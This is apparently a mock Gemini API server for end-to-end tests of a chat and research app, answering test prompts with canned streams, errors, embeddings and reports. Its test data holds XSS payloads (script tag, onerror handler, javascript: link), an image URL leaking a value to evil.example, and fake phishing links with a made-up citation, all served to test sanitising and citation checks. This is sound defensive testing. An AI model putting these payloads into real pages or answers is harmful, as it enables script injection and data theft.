// A local stand-in for the Gemini API's streamGenerateContent endpoint, so the
// E2E tests never call Google or spend a key. The Worker under test points at
// it with GEMINI_BASE_URL (playwright.config.ts). What it answers depends on
// the last user message:
//   "mock:slow ..."     streams 40 chunks, 150 ms apart (for Stop)
//   "mock:xss"          answers with hostile Markdown and HTML
//   "mock:fail"         a 500 before any text
//   "mock:stall"        the chat model (gemini-3.5-flash-lite) never answers;
//                       any other model (the fallback) says which it is
//   "mock:drop"         the chat model (gemini-3.5-flash-lite) streams a few
//                       words, then Gemini's mid-stream 503 ("overloaded");
//                       any other model (the fallback) answers in full
//   "mock:dropall"      every model breaks off like that
//   "mock:history"      repeats how Wren's previous turn began, and whether it
//                       holds a report's sources (research in chat)
//   anything about a heat pump: a realistic Markdown answer (for screenshots)
// and on the key: one starting "bad-" gets Gemini's invalid-key answer.
// Research uses generateContent (not streamed), told apart by its system prompt:
//   the planner        three queries, each keeping the question's mock: tag
//                      ("mock:fail" in the question: a 500 instead)
//   the report writer  a report citing every source it was given; for
//                      "mock:hostile" also a citation of a source that doesn't
//                      exist and links to a page that wasn't read
// The daily model check's one-word question ("Reply with exactly one word.") gets "ok".
// Memory's calls: batchEmbedContents answers with tests/mocks/embedding.mjs,
// and generateContent (JSON) reads a PDF (the text in its "(...) Tj" strings)
// or picks facts: each sentence of the person's messages that says "I" or
// "my" (at most 3), except a "remember that ..." request, which voice's
// save_to_memory already saved; "mock:fail" anywhere fails. Asked which facts an answer
// used, it names each fact sharing a word of five letters or more with it.
// It also stands in for Turnstile's siteverify (POST /siteverify), and for
// Gemini Live's WebSocket (tests/mocks/live.mjs).
import { createServer } from 'node:http'
import { mockEmbedding } from './embedding.mjs'
import { attachLive } from './live.mjs'

const port = Number(process.env.MOCK_GEMINI_PORT ?? 3127)
const host = process.env.E2E_HOST ?? '127.0.0.2'

const XSS = [
  'Here is **bold** text and a [safe link](https://example.com).',
  '',
  '<script>window.__xss = 1</script><img src=x onerror="window.__xss=2">',
  '',
  '[click](javascript:window.__xss=3) ![tracker](https://evil.example/p.png?d=secret)',
].join('\n')

const SAMPLE = [
  'For a 1960s house with about **38,000 BTU/h** of heat loss at -13°F, a cold-climate heat pump around **3.5 tons** covers it with headroom.',
  '',
  'Two things to check before you get quotes:',
  '',
  '1. **Ductwork.** An undersized trunk line will make any unit noisy and short of air.',
  '2. **Backup heat.** Decide whether to keep the furnace for the coldest nights.',
  '',
  '| Size | Covers | Good for |',
  '|---|---|---|',
  '| 3 tons | ~36,000 BTU/h | tight, well-insulated homes |',
  '| 3.5 tons | ~42,000 BTU/h | your house, with margin |',
].join('\n')

const REPORT = (n) =>
  [
    `For under $1,500, put the battery, the brakes and the motor first: a battery of at least 500 Wh with named cells and UL 2849 certification, hydraulic disc brakes, and a motor that suits your hills [1]${n > 1 ? '[2]' : ''}.`,
    '',
    '## What to check',
    '',
    `- **Battery.** Certified packs are much less likely to catch fire, and a 500 Wh battery gives roughly 50 to 80 km of range [1]${n > 2 ? '[3]' : ''}.`,
    `- **Brakes.** Hydraulic discs stop a heavy bike far better than mechanical ones [${Math.min(2, n)}].`,
    `- **Motor.** Hub motors are cheaper and simpler; mid-drives climb better but wear chains faster [${Math.min(4, n)}].`,
    '',
    '| Part | Look for |',
    '|---|---|',
    `| Battery | 500 Wh or more, UL 2849 [1] |`,
    `| Brakes | Hydraulic disc [${Math.min(2, n)}] |`,
  ].join('\n')

const HOSTILE_EXTRA = [
  '',
  'Also see [the login page](https://evil.example/login) and https://evil.example/steal for more [9].',
  '',
  '[1]: https://evil.example/ref',
].join('\n')

/** Sends a JSON answer; true, so a handler can say it answered. */
function json(res, status, body) {
  res.writeHead(status, { 'Content-Type': 'application/json' })
  res.end(JSON.stringify(body))
  return true
}

function answer(res, text) {
  return json(res, 200, { candidates: [{ content: { role: 'model', parts: [{ text }] }, finishReason: 'STOP', index: 0 }] })
}

/** Research's one-shot calls (agent/gemini.ts generateText); false when the call isn't research's. */
function researchCall(res, body) {
  const system = body.systemInstruction?.parts?.map((p) => p.text).join(' ') ?? ''
  const prompt = (body.contents ?? []).flatMap((t) => t.parts ?? []).map((p) => p.text ?? '').join('\n')
  if (system.startsWith('Reply with exactly one word')) return answer(res, 'ok')
  if (system.startsWith('You plan web research')) {
    const question = prompt.replace(/^Question:\s*/, '')
    if (question.includes('mock:fail')) return json(res, 500, { error: { code: 500, message: 'internal', status: 'INTERNAL' } })
    const tag = question.match(/mock:[a-z-]+/)?.[0]
    const topic = tag ? `${tag} e-bike` : 'e-bike under $1,500'
    return answer(res, JSON.stringify({ queries: [`${topic} buying guide`, `${topic} battery safety`, `${topic} hub vs mid-drive motor`] }))
  }
  if (system.startsWith('You write research reports')) {
    const n = Number(prompt.match(/There are (\d+) sources/)?.[1] ?? 0)
    // The page's fake markers must arrive defused: a real-looking end marker means they weren't.
    const id = prompt.match(/<<<BEGIN SOURCE 1 ([0-9a-f]+)>>>/)?.[1]
    const markers = prompt.match(/<<<(BEGIN|END) SOURCE \d+ [0-9a-z]+>>>/g) ?? []
    if (!id || markers.some((m) => !m.endsWith(`${id}>>>`))) return answer(res, 'DEFUSE FAILED')
    return answer(res, REPORT(n) + (prompt.includes('mock:hostile') ? HOSTILE_EXTRA : ''))
  }
  return false
}

function pdfText(base64) {
  const raw = Buffer.from(base64, 'base64').toString('latin1')
  return [...raw.matchAll(/\(([^)]*)\)\s*Tj/g)].map((m) => m[1]).join('\n')
}

function pickFacts(text) {
  const own = text.replace(/^Message \d+:$/gm, '')
  return own
    .split(/(?<=[.!?])\s+|\n+/)
    .map((s) => s.trim())
    .filter((s) => /\b(i|i'm|my)\b/i.test(s) && !/remember that/i.test(s))
    .slice(0, 3)
}

/** Memory's non-streaming calls: embeddings, and JSON answers for reading PDFs and picking facts. */
function memoryCall(req, res, body) {
  if (/:batchEmbedContents/.test(req.url ?? '')) {
    const embeddings = (body.requests ?? []).map((r) => {
      const text = (r.content?.parts ?? []).map((p) => p.text ?? '').join(' ')
      return { values: mockEmbedding(text, r.outputDimensionality ?? 768) }
    })
    if (embeddings.some((_, i) => /mock:fail/.test(JSON.stringify(body.requests[i])))) {
      return json(res, 500, { error: { code: 500, message: 'internal', status: 'INTERNAL' } })
    }
    return json(res, 200, { embeddings })
  }
  const parts = (body.contents ?? []).flatMap((c) => c.parts ?? [])
  const text = parts.map((p) => p.text ?? '').join('\n')
  const system = body.systemInstruction?.parts?.map((p) => p.text).join(' ') ?? ''
  if (system.startsWith('You check which facts')) {
    const [head, factPart = ''] = text.split('\n\nFacts:\n')
    const answerPart = head.split('\n\nAnswer:\n')[1] ?? head
    const words = new Set(answerPart.toLowerCase().match(/[a-z]{5,}/g) ?? [])
    const used = [...factPart.matchAll(/^\[(f\d+)\] (.*)$/gm)]
      .filter(([, , fact]) => (fact.toLowerCase().match(/[a-z]{5,}/g) ?? []).some((w) => words.has(w)))
      .map(([, id]) => id)
    return json(res, 200, { candidates: [{ content: { role: 'model', parts: [{ text: JSON.stringify({ used }) }] }, index: 0 }] })
  }
  if (/mock:fail/.test(text)) return json(res, 500, { error: { code: 500, message: 'internal', status: 'INTERNAL' } })
  const pdf = parts.find((p) => p.inlineData?.mimeType === 'application/pdf')
  const answer = pdf ? { text: pdfText(pdf.inlineData.data) } : { facts: pickFacts(text) }
  return json(res, 200, { candidates: [{ content: { role: 'model', parts: [{ text: JSON.stringify(answer) }] }, index: 0 }] })
}

/** Some text, then the error Gemini sends inside a stream when the model is overloaded. */
function dropMidStream(res, chunks) {
  res.writeHead(200, { 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache' })
  for (const text of chunks) {
    res.write(`data: ${JSON.stringify({ candidates: [{ content: { role: 'model', parts: [{ text }] }, index: 0 }] })}\r\n\r\n`)
  }
  setTimeout(() => {
    res.end(`data: ${JSON.stringify({ error: { code: 503, message: 'The model is overloaded. Please try again later.', status: 'UNAVAILABLE' } })}\r\n\r\n`)
  }, 60)
}

function sse(res, chunks, delay) {
  res.writeHead(200, { 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache' })
  let i = 0
  const next = () => {
    if (res.destroyed) return
    if (i >= chunks.length) return res.end()
    const body = { candidates: [{ content: { role: 'model', parts: [{ text: chunks[i++] }] }, index: 0 }] }
    res.write(`data: ${JSON.stringify(body)}\r\n\r\n`)
    setTimeout(next, delay)
  }
  next()
}

const server = createServer((req, res) => {
  if (req.method === 'GET' && req.url === '/health') return res.end('ok')
  let raw = ''
  req.on('data', (c) => (raw += c))
  req.on('end', () => {
    // Turnstile's siteverify: Cloudflare's always-pass test widget token, or any
    // token starting "test-ok" (API tests), passes; anything else fails.
    if (req.url === '/siteverify') {
      const token = raw.match(/name="response"\r\n\r\n([^\r]*)/)?.[1] ?? ''
      const success = token === 'XXXX.DUMMY.TOKEN.XXXX' || token.startsWith('test-ok')
      res.writeHead(200, { 'Content-Type': 'application/json' })
      res.end(JSON.stringify({ success, 'error-codes': success ? [] : ['invalid-input-response'] }))
      return
    }
    if (!/:(streamGenerateContent|generateContent|batchEmbedContents)/.test(req.url ?? '')) {
      res.writeHead(404).end()
      return
    }
    const key = req.headers['x-goog-api-key'] ?? ''
    if (String(key).startsWith('bad-')) {
      res.writeHead(400, { 'Content-Type': 'application/json' })
      res.end(JSON.stringify({ error: { code: 400, message: 'API key not valid. Please pass a valid API key.', status: 'INVALID_ARGUMENT' } }))
      return
    }
    let body = {}
    try {
      body = JSON.parse(raw)
    } catch {}
    if (!/:streamGenerateContent/.test(req.url ?? '')) return researchCall(res, body) || memoryCall(req, res, body)
    const turns = body.contents ?? []
    const last = turns.filter((t) => t.role === 'user').at(-1)?.parts?.[0]?.text ?? ''
    if (last.startsWith('mock:fail')) {
      res.writeHead(500, { 'Content-Type': 'application/json' })
      res.end(JSON.stringify({ error: { code: 500, message: 'internal', status: 'INTERNAL' } }))
      return
    }
    if (last.startsWith('mock:stall')) {
      const model = /models\/([^:]+):/.exec(req.url ?? '')?.[1] ?? ''
      // The chat model hangs with the connection open, as a stalled model does.
      if (model === 'gemini-3.5-flash-lite') return
      return sse(res, [`Answered by ${model}.`], 10)
    }
    if (last.startsWith('mock:drop')) {
      const model = /models\/([^:]+):/.exec(req.url ?? '')?.[1] ?? ''
      if (last.startsWith('mock:dropall') || model === 'gemini-3.5-flash-lite') return dropMidStream(res, ['Cut ', 'short ', 'here'])
      return sse(res, [`The whole answer, `, `from ${model}.`], 10)
    }
    if (last.startsWith('mock:xss')) return sse(res, [XSS], 10)
    if (last.startsWith('mock:history')) {
      const before = turns.filter((t) => t.role === 'model').at(-1)?.parts?.[0]?.text ?? ''
      const reply = `Your last turn began: ${before.split('\n')[0].slice(0, 120)} Sources listed: ${before.includes('\nSources:\n[1] ') ? 'yes' : 'no'}.`
      return sse(res, reply.match(/.{1,16}/gs) ?? [reply], 10)
    }
    if (/heat pump/i.test(last)) return sse(res, SAMPLE.match(/.{1,24}/gs), 12)
    if (last.startsWith('mock:slow')) return sse(res, Array.from({ length: 40 }, (_, n) => `word${n} `), 150)
    const reply = `You said: "${last}". This is turn ${turns.filter((t) => t.role === 'user').length} of our **chat**.`
    return sse(res, reply.match(/.{1,12}/gs) ?? [reply], 15)
  })
})
// Voice: Gemini Live's WebSocket (tests/mocks/live.mjs).
attachLive(server)
server.listen(port, host, () => console.log(`mock gemini on ${host}:${port}`))
